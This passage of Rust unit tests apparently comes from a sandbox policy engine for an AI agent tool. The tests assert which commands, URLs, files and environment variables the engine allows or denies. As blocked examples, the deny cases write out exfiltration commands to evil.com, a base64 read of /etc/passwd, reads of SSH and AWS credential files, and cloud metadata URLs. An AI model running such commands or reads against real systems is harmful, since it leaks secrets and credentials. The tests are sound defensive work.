        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "http.createServer", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "fetch", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("python3 -c 'import os'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'system(\"ls\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("base64 /etc/passwd");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_commands_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("node server.js");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("git status");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("npm install express");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("docker run nginx");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ssh user@gateway.example.com");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ffmpeg -i input.ogg output.mp3");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sh -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_execution("bash -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_commands_reviewed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sudo coredns");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_openclaw_cloud_metadata_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_ai_and_chat_apis_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "https://api.anthropic.com/v1/messages",
            "api.anthropic.com/v1/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.openai.com/v1/chat/completions",
            "api.openai.com/v1/chat/completions",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://slack.com/api/chat.postMessage",
            "slack.com/api/chat.postMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.telegram.org/bot123/sendMessage",
            "api.telegram.org/bot123/sendMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://discord.com/api/v10/channels/123/messages",
            "discord.com/api/v10/channels/123/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_localhost_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "http://127.0.0.1:3000/health",
            "127.0.0.1:3000/health",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "http://localhost:8080/api",
            "localhost:8080/api",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_unlisted_domains_denied() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "https://evil.com/exfil",
            "evil.com/exfil",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_protocols_restricted() {
        let engine = openclaw_engine();

        assert_eq!(engine.evaluate_protocol("https").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_credential_files_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal files allowed
        let d = engine.evaluate_file("/tmp/config.json", Operation::Read);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_hard_secrets_blocked() {
        let engine = openclaw_engine();

        // Block mode for infrastructure credentials
        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_legitimate_keys_warned() {
        let engine = openclaw_engine();

        // Warn mode for keys openclaw legitimately reads
        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("CLAUDE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("OPENCLAW_PORT");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_normal_envvars_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("NODE_ENV");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_anti_tracing_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_native_getpass_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_anonymity_domains_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("service.i2p");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("tunnel.loki");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

}
